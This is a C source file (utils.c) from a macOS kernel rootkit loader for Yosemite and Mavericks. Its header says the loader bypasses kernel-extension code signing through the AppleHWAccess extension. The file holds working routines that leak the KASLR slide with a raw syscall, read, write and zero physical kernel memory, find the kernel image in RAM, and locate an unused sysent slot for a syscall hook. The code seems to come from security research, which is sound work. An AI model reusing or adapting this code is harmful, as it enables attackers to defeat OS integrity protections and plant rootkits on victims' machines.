/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.     .----.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'    \_,-.  |
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.        .' .'
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'       .'  /_
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.     |      |
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'     `------'
 *
 * A kernel rootkit load based on AppleHWAccess kernel extension for Yosemite and Mavericks
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * This rootkit loader bypasses kernel extensions code signing requirement by leveraging
 * access to AppleHWAccess.kext, which allows to read/write computer physical memory.
 *
 * utils.c
 * All kind of auxiliary functions
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "utils.h"

#include <sys/types.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/sysctl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>

#include "logging.h"
#include "kernel_symbols.h"
#include "structures.h"

#define kAppleHWAccessClass "AppleHWAccess"
#define kAppleHWRead 0
#define kAppleHWWrite 1

struct __attribute__ ((packed)) HWRequest
{
    uint32_t width;
    uint64_t offset;
    uint64_t data;
};

// from xnu/bsd/sys/kas_info.h
#define KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR     (0)     /* returns uint64_t     */
#define KAS_INFO_MAX_SELECTOR           (1)

#define SYSCALL_CLASS_SHIFT                     24
#define SYSCALL_CLASS_MASK                      (0xFF << SYSCALL_CLASS_SHIFT)
#define SYSCALL_NUMBER_MASK                     (~SYSCALL_CLASS_MASK)
#define SYSCALL_CLASS_UNIX                      2
#define SYSCALL_CONSTRUCT_UNIX(syscall_number) \
((SYSCALL_CLASS_UNIX << SYSCALL_CLASS_SHIFT) | \
(SYSCALL_NUMBER_MASK & (syscall_number)))

static kern_return_t ReadHWAccess(uint64_t address, uint64_t length, uint8_t *data, uint32_t read_size);
static kern_return_t WriteHWAccess(uint64_t address, uint64_t length, uint8_t *data, uint32_t write_size);

#pragma mark -
#pragma mark Exported functions

/*
 * lame inline asm to use the kas_info() syscall. beware the difference if we want 64bits syscalls!
 */
void
get_kaslr_slide(size_t *size, uint64_t *slide)
{
    // this is needed for 64bits syscalls!!!
    // good post about it http://thexploit.com/secdev/mac-os-x-64-bit-assembly-system-calls/
    uint64_t syscallnr = SYSCALL_CONSTRUCT_UNIX(SYS_kas_info);
    uint64_t selector = KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR;
    int result = 0;
    __asm__ ("movq %1, %%rdi\n\t"
             "movq %2, %%rsi\n\t"
             "movq %3, %%rdx\n\t"
             "movq %4, %%rax\n\t"
             "syscall"
             : "=a" (result)
             : "r" (selector), "m" (slide), "m" (size), "a" (syscallnr)
             : "rdi", "rsi", "rdx", "rax"
             );
}

int
get_kernel_version(void)
{
	size_t size = 0;
	if ( sysctlbyname("kern.osrelease", NULL, &size, NULL, 0) )
    {
        ERROR_MSG("Failed to get kern.osrelease size.");
        return -1;
    }
	char *osrelease = malloc(size);
    if (osrelease == NULL)
    {
        ERROR_MSG("Failed to allocate memory.");
        return -1;
    }
	if ( sysctlbyname("kern.osrelease", osrelease, &size, NULL, 0) )
    {
        ERROR_MSG("Failed to get kern.osrelease.");
        free(osrelease);
        return -1;
    }
    char major[3] = {0};
    strncpy(major, osrelease, 2);
    free(osrelease);
    
    return (int)strtol(major, (char**)NULL, 10);
}

kern_return_t
service_available(void)
{
    io_service_t service = MACH_PORT_NULL;
    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(kAppleHWAccessClass));
    if (!service)
    {
        ERROR_MSG("Can't find AppleHWAccess service.");
        return KERN_FAILURE;
    }
    IOObjectRelease(service);
    return KERN_SUCCESS;
}

kern_return_t
readkmem(uint64_t address, uint64_t length, void *buffer)
{
    uint64_t avail_mem = 0;
    size_t len  = sizeof(avail_mem);
    if ( sysctlbyname("hw.memsize", &avail_mem, &len, NULL, 0) != 0 )
    {
        ERROR_MSG("Failed to retrieve available memory.");
        return KERN_FAILURE;
    }

    if (address + length > avail_mem)
    {
        ERROR_MSG("Requested address is out of available memory bounds.");
        return KERN_FAILURE;
    }
    
    uint64_t quotient = length / 8;
    uint64_t remainder = length % 8;
    /* try to read maximum possible data as 64 bits */
    if (quotient > 0)
    {
        ReadHWAccess(address, length - remainder, (uint8_t*)buffer, 8);
    }
    /* read everything else byte by byte */
    if (remainder > 0)
    {
        ReadHWAccess(address + length - remainder, remainder, (uint8_t*)((char*)buffer + length - remainder), 1);
    }

    return KERN_SUCCESS;
}

/*
 * NOTE: the data buffer size must be equal to length else things will go badly wrong!
 */
kern_return_t
writekmem(UInt64 address, UInt64 length, void *data)
{
    uint64_t avail_mem = 0;
    size_t len  = sizeof(avail_mem);
    if ( sysctlbyname("hw.memsize", &avail_mem, &len, NULL, 0) != 0 )
    {
        ERROR_MSG("Failed to retrieve available memory.");
        return KERN_FAILURE;
    }

    if (address + length > avail_mem)
    {
        ERROR_MSG("Requested address is out of available memory bounds.");
        return KERN_FAILURE;
    }
    
    uint64_t quotient = length / 8;
    uint64_t remainder = length % 8;
    /* try to write maximum possible data as 64 bits */
    if (quotient > 0)
    {
        WriteHWAccess(address, length - remainder, (uint8_t*)data, 8);
    }
    /* write everything else byte by byte */
    if (remainder > 0)
    {
        WriteHWAccess(address + length - remainder, remainder, (uint8_t*)((char*)data + length - remainder) , 1);
    }
    
    return KERN_SUCCESS;
}

kern_return_t
zerokmem(uint64_t address, uint64_t length)
{
    uint64_t available_mem = 0;
    size_t len  = sizeof(available_mem);
    if ( sysctlbyname("hw.memsize", &available_mem, &len, NULL, 0) != 0 )
    {
        ERROR_MSG("Failed to retrieve available memory.");
        return KERN_FAILURE;
    }
    /* because WriteHWAccess expects the buffer the same size as length we need to fake it */
    uint8_t *zero = calloc(1, length);
    if (zero != NULL)
    {
        writekmem(address, length, (void*)zero);
        free(zero);
    }
    
    // alternative is to iterate ourselves
#if 0
    unsigned char zero = 0;
    for (uint64_t i = 0; i < length; i++)
    {
        WriteHWAccess(address + i, 1, (void*)&zero, 1);
    }
#endif
    return KERN_SUCCESS;
}

kern_return_t
map_kernel_buffer(uint8_t **kernel_buffer, size_t *kernel_size)
{
    OUTPUT_MSG("-----[ Mapping kernel image ]-----");
    /* find and map the kernel file */
    /* NOTE: we could instead read this directly from kernel memory */
    int kernel_version = get_kernel_version();
    if (kernel_version == -1)
    {
        ERROR_MSG("Failed to retrieve current kernel version!");
        return KERN_FAILURE;
    }
    
    int kernel_fd = -1;
    
    /* Mavericks or lower have /mach_kernel */
    if (kernel_version <= 13)
    {
        kernel_fd = open("/mach_kernel", O_RDONLY);
        if (kernel_fd < 0)
        {
            ERROR_MSG("Can't open /mach_kernel.");
            return KERN_FAILURE;
        }
    }
    /* Yosemite moved kernel file to /System/Library/Kernels/kernel */
    else if (kernel_version >= 14)
    {
        kernel_fd = open("/System/Library/Kernels/kernel", O_RDONLY);
        if (kernel_fd < 0)
        {
            ERROR_MSG("Can't open /System/Library/Kernels/kernel.");
            return KERN_FAILURE;
        }
    }
    
    struct stat statbuf = {0};
    if ( fstat(kernel_fd, &statbuf) < 0 )
    {
        ERROR_MSG("Can't fstat file: %s", strerror(errno));
        close(kernel_fd);
        return KERN_FAILURE;
    }
    
    if ( (*kernel_buffer = mmap(0, statbuf.st_size, PROT_READ, MAP_SHARED, kernel_fd, 0)) == MAP_FAILED)
    {
        ERROR_MSG("Mmap failed on file: %s", strerror(errno));
        close(kernel_fd);
        return KERN_FAILURE;
    }

    /* return size so we can unmap */
    *kernel_size = statbuf.st_size;

    close(kernel_fd);
    return KERN_SUCCESS;
}

int
unmap_kernel_buffer(uint8_t *kernel_buffer, size_t kernel_size)
{
    munmap(kernel_buffer, kernel_size);
    return 0;
}

kern_return_t
find_kernel_bruteforce(uint8_t *kernel_buf, struct kernel_info *kinfo, mach_vm_address_t *kernel_addr)
{
    OUTPUT_MSG("-----[ Finding kernel image location, the bruteforce way ]-----");
    
    uint64_t avail_mem = 0;
    size_t len  = sizeof(avail_mem);
    if ( sysctlbyname("hw.memsize", &avail_mem, &len, NULL, 0) != 0 )
    {
        ERROR_MSG("Failed to retrieve available memory.");
        return KERN_FAILURE;
    }
    
    uint64_t read_addr = 0x0;
    /* buffer */
    uint8_t *buffer = calloc(1, 0x1000);
    if (buffer == NULL)
    {
        ERROR_MSG("Failed to allocate buffer.");
        return KERN_FAILURE;
    }
    
    for (uint64_t x = 0; x < avail_mem/0x1000; x++)
    {
        readkmem(read_addr, 0x1000, buffer);
        if (memcmp(kernel_buf, buffer, 53) == 0)
        {
            struct mach_header_64 *mh = (struct mach_header_64*)buffer;
            if (mh->magic == MH_MAGIC_64)
            {
                struct segment_command_64 *sc = (struct segment_command_64*)(buffer + sizeof(struct mach_header_64));
                if (strncmp(sc->segname, "__TEXT", 16) == 0)
                {
                    /* if this header contains the KASLR there's a strong probability it's what we are looking for */
                    if (sc->vmaddr == (kinfo->text_vmaddr + kinfo->kaslr_slide))
                    {
                        DEBUG_MSG("Found kernel at 0x%llx", x*0x1000);
                        DEBUG_MSG("__TEXT VMADDR: 0x%llx", sc->vmaddr);
                        *kernel_addr = read_addr;
                        free(buffer);
                        return KERN_SUCCESS;
                    }
                }
            }
        }
        read_addr += 0x1000;
    }
    
    free(buffer);
    return KERN_FAILURE;
}

kern_return_t
find_kernel_smart(uint8_t *kernel_buf, struct kernel_info *kinfo, mach_vm_address_t *kernel_addr)
{
    OUTPUT_MSG("-----[ Finding kernel image location, the smart way ]-----");
    
    uint64_t avail_mem = 0;
    size_t len  = sizeof(avail_mem);
    if ( sysctlbyname("hw.memsize", &avail_mem, &len, NULL, 0) != 0 )
    {
        ERROR_MSG("Failed to retrieve available memory.");
        return KERN_FAILURE;
    }

    /* use the known info about the kernel address to start searching */
    uint64_t read_addr = (kinfo->text_vmaddr + kinfo->kaslr_slide) & 0x00000000FFFFFFFF;
    
    /* buffer */
    uint8_t *buffer = calloc(1, 0x1000);
    if (buffer == NULL)
    {
        ERROR_MSG("Failed to allocate buffer.");
        return KERN_FAILURE;
    }

    for (uint64_t x = read_addr/0x1000; x < avail_mem/0x1000; x++)
    {
        readkmem(read_addr, 0x1000, buffer);
        if (memcmp(kernel_buf, buffer, 53) == 0)
        {
            struct mach_header_64 *mh = (struct mach_header_64*)buffer;
            if (mh->magic == MH_MAGIC_64)
            {
                struct segment_command_64 *sc = (struct segment_command_64*)(buffer + sizeof(struct mach_header_64));
                if (strncmp(sc->segname, "__TEXT", 16) == 0)
                {
                    /* if this header contains the KASLR there's a strong probability it's what we are looking for */
                    if (sc->vmaddr == (kinfo->text_vmaddr + kinfo->kaslr_slide))
                    {
                        OUTPUT_MSG("Found kernel at 0x%llx", read_addr);
                        DEBUG_MSG("__TEXT VMADDR: 0x%llx", sc->vmaddr);
                        *kernel_addr = read_addr;
                        free(buffer);
                        return KERN_SUCCESS;
                    }
                }
            }
        }
        read_addr += 0x1000;
    }
    
    free(buffer);
    return KERN_FAILURE;
}

/* find where the sysent table is located
 * and get the address of a free slot
 * right now we locate the wait4 symbol and use the next slot known to be unused
 * a better method would be to locate a random free slot instead.
 */
kern_return_t
find_kernel_sysent(uint8_t *kernel_buf, struct kernel_info *kinfo, struct rk_info *rk_info)
{
    OUTPUT_MSG("-----[ Finding kernel sysent table location ]-----");
    
    uint64_t avail_mem = 0;
    size_t len  = sizeof(avail_mem);
    if ( sysctlbyname("hw.memsize", &avail_mem, &len, NULL, 0) != 0 )
    {
        ERROR_MSG("Failed to retrieve available memory.");
        return KERN_FAILURE;
    }

    mach_vm_address_t enosys_addr = solve_kernel_symbol(kinfo, "_enosys");
    mach_vm_address_t nosys_addr = solve_kernel_symbol(kinfo, "_nosys");
    mach_vm_address_t wait4_addr = solve_kernel_symbol(kinfo, "_wait4");
    DEBUG_MSG("wait4 address 0x%llx", wait4_addr);
    DEBUG_MSG("enosys address 0x%llx", enosys_addr);
    DEBUG_MSG("nosys address 0x%llx", nosys_addr);
    /* use the known info about the kernel address to start searching */
    uint64_t read_addr = rk_info->kernel_phys_addr;
    
    /* buffer */
    uint8_t *buffer = calloc(1, 0x1000);
    if (buffer == NULL)
    {
        ERROR_MSG("Failed to allocate buffer.");
        return KERN_FAILURE;
    }

    int kern_ver = get_kernel_version();
    for (uint64_t x = read_addr/0x1000; x < avail_mem/0x1000; x++)
    {
        readkmem(read_addr, 0x1000, buffer);
        for (uint64_t z = 0; z < 0x1000; z += 8)
        {
            if (*(uint64_t*)(buffer + z) == wait4_addr)
            {
                DEBUG_MSG("Found wait4 at physical address 0x%llx", read_addr+z);
                /* sysent structures are different between Mavericks and Yosemite but also the pointer at next sysent address after wait4 */
                if (kern_ver == 13)
                {
                    struct sysent_mavericks *sysent = (struct sysent_mavericks*)(buffer + z);
                    /* the next entry should be originally equal to nosys because it's unused syscall */
                    if ( (mach_vm_address_t)((sysent + 1)->sy_call) == nosys_addr )
                    {
                        DEBUG_MSG("Found nosys at physical address 0x%llx", read_addr + z + sizeof(struct sysent_mavericks));
                        rk_info->sysent_phys_addr = read_addr + z + sizeof(struct sysent_mavericks);
                        rk_info->nosys_addr = nosys_addr;
                        free(buffer);
                        return KERN_SUCCESS;
                    }
                }
                else if (kern_ver == 14)
                {
                    struct sysent_yosemite *sysent = (struct sysent_yosemite*)(buffer + z);
                    /* the next entry should be originally equal to enosys because it's unused syscall */
                    if ( (mach_vm_address_t)((sysent + 1)->sy_call) == enosys_addr )
                    {
                        DEBUG_MSG("Found enosys at physical address 0x%llx", read_addr + z + sizeof(struct sysent_yosemite));
                        rk_info->sysent_phys_addr = read_addr + z + sizeof(struct sysent_yosemite);
                        rk_info->nosys_addr = enosys_addr;
                        free(buffer);
                        return KERN_SUCCESS;
                    }
                }
            }
        }
        read_addr += 0x1000;
    }

    free(buffer);
    return KERN_FAILURE;
}

#pragma mark -
#pragma mark Local functions

/* original functions by SJ_UnderWater @ tonymacx86.com forums
 * http://www.tonymacx86.com/apple-news-rumors/112304-applehwaccess-random-memory-read-write.html
 */

/*
 * read physical memory
 * can be done in steps of 1, 2, 4, 8 bytes each time
 */
static kern_return_t
ReadHWAccess(uint64_t address, uint64_t length, uint8_t *data, uint32_t read_size)
{
    kern_return_t kr = 0;

    switch (read_size)
    {
        case 1:
        case 2:
        case 4:
        case 8:
            break;
        default:
            ERROR_MSG("Invalid request size to %s.", __FUNCTION__);
            return KERN_FAILURE;
    }

    io_service_t service = MACH_PORT_NULL;
    /* open connection to the kernel extension */
    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(kAppleHWAccessClass));
    if (!service)
    {
        ERROR_MSG("Can't find AppleHWAccess service.");
        return KERN_FAILURE;
    }

    io_connect_t connect = MACH_PORT_NULL;
    kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to open AppleHWAccess IOService.");
        IOObjectRelease(service);
        return KERN_FAILURE;
    }
    
    uint32_t in_size = read_size * 8;
    struct HWRequest in = {in_size, address};
    struct HWRequest out = {0};
    
    size_t size = sizeof(struct HWRequest);
    
    while (in.offset < address+length)
    {
        /* selector = 0 for read */
        if ( (kr = IOConnectCallStructMethod(connect, 0, &in, size, &out, &size)) != KERN_SUCCESS)
        {
            ERROR_MSG("IOConnectCallStructMethod failed: %x", kr);
            break;
        }
        memcpy(data, &out.data, read_size);
        in.offset += read_size;
        data += read_size;
    }
    
    IOServiceClose(connect);
    IOObjectRelease(connect);
    IOObjectRelease(service);
    return KERN_SUCCESS;
}

static kern_return_t
WriteHWAccess(uint64_t address, uint64_t length, uint8_t *data, uint32_t write_size)
{
    kern_return_t kr = 0;
    io_service_t service = MACH_PORT_NULL;
    
    if (length == 0 || data == NULL || write_size == 0)
    {
        ERROR_MSG("Invalid write parameters.");
        return KERN_FAILURE;
    }
    
    switch (write_size)
    {
        case 1:
        case 2:
        case 4:
        case 8:
            break;
        default:
            ERROR_MSG("Invalid request size to %s.", __FUNCTION__);
            return KERN_FAILURE;
    }
    
    /* open connection to the kernel extension */
    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(kAppleHWAccessClass));
    if (!service)
    {
        ERROR_MSG("Can't find AppleHWAccess service.");
        return KERN_FAILURE;
    }
    
    io_connect_t connect = MACH_PORT_NULL;
    kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to open AppleHWAccess IOService.");
        IOObjectRelease(service);
        return KERN_FAILURE;
    }
    
    /* the size of the write in bits */
    uint32_t in_size = write_size * 8;
    struct HWRequest in = {in_size, address};
    struct HWRequest out = {0};
    uint8_t *data_to_write = data;
    
    size_t size = sizeof(struct HWRequest);
    while (in.offset < address+length)
    {
        memcpy((void*)&in.data, data_to_write, write_size);
        /* selector = 1 for write */
        if ( (kr = IOConnectCallStructMethod(connect, 1, &in, size, &out, &size)) != KERN_SUCCESS )
        {
            ERROR_MSG("IOConnectCallStructMethod failed: %x", kr);
            break;
        }
        in.offset += in.width / 8;
        data_to_write += write_size;
    }
    
    IOServiceClose(connect);
    IOObjectRelease(connect);
    IOObjectRelease(service);
    return KERN_SUCCESS;
}
